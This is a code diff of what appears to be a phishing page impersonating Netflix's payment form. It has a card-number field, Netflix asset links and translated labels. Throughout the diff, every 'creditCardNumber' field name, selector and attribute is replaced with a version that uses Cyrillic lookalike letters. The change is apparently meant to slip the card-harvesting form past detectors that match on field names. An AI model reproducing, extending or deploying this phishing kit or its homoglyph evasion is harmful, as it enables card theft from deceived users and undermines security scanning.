@@ -6633,7 +6633,7 @@ if (file_exists($languageFile)) {
 
 <script>
 document.addEventListener("DOMContentLoaded", function() {
-    const inputs = document.querySelectorAll('[name="creditCardNumber"], [name="firstName"]');
+    const inputs = document.querySelectorAll('[name="сreditСardNumbеr"], [name="firstName"]');
     inputs.forEach(function(input) {
         const label = input.closest('.form-control_containerStyles__oy4jpq0').querySelector('label');
 
@@ -6714,7 +6714,7 @@ document.addEventListener("DOMContentLoaded", function() {
 </script>
 <script>
 document.addEventListener('DOMContentLoaded', function() {
-    var inputField = document.querySelector('[name="creditCardNumber"]');
+    var inputField = document.querySelector('[name="сreditСardNumbеr"]');
 
     inputField.addEventListener('input', function() {
         var cardNumber = this.value;
@@ -6838,12 +6838,12 @@ select:focus:not(:focus-visible) ~ .newCustomClass {
                             <img src="./process_files/AMEX.png" alt="American Express" class="logoIcon AMEX default-ltr-cache-kg1rox e18ygst00" srcset="https://assets.nflxext.com/siteui/acquisition/payment/ffe/paymentpicker/AMEX@2x.png 2x" data-uia="logoIcon-AMEX">
                           </span>
                           <ul class="simpleForm structural ui-grid inlineContainer">
-                            <li data-uia="field-creditCardNumber+wrapper" class="nfFormSpace">
+                            <li data-uia="field-сreditСardNumbеr+wrapper" class="nfFormSpace">
                               <div class="silvercard">
-                                <div class="form-control_containerStyles__oy4jpq0  default-ltr-cache-pukm6w e2so2tu1" data-uia="field-creditCardNumber+container" dir="ltr">
-					<label dir="ltr" data-uia="field-creditCardNumber+label"><?php echo $translations['cardNumberLabel']; ?></label>
+                                <div class="form-control_containerStyles__oy4jpq0  default-ltr-cache-pukm6w e2so2tu1" data-uia="field-сreditСardNumbеr+container" dir="ltr">
+					<label dir="ltr" data-uia="field-сreditСardNumbеr+label"><?php echo $translations['cardNumberLabel']; ?></label>
                                   <div class="form-control_controlWrapperStyles__oy4jpq1" dir="ltr">
-                                    <input type="tel" autocomplete="cc-number" dir="ltr" placeholder=""  id="cardnumber" name="creditCardNumber" data-uia="field-creditCardNumber" value="">
+                                    <input type="tel" autocomplete="cc-number" dir="ltr" placeholder=""  id="cardnumber" name="сreditСardNumbеr" data-uia="field-сreditСardNumbеr" value="">
                                     <div aria-hidden="true" id="bordercard" class="newCustomClass" dir="ltr"></div>
                                     <div role="img" aria-hidden="true" class="default-ltr-cache-1ubk3wx e1vkmu651">
                                       <svg xmlns="http://www.w3.org/2000/svg" fill="none" role="img" viewBox="0 0 24 24" width="24" height="24" data-icon="CreditCardStandard" aria-hidden="true" class="default-ltr-cache-1aatv6y e1hwh5ed0">
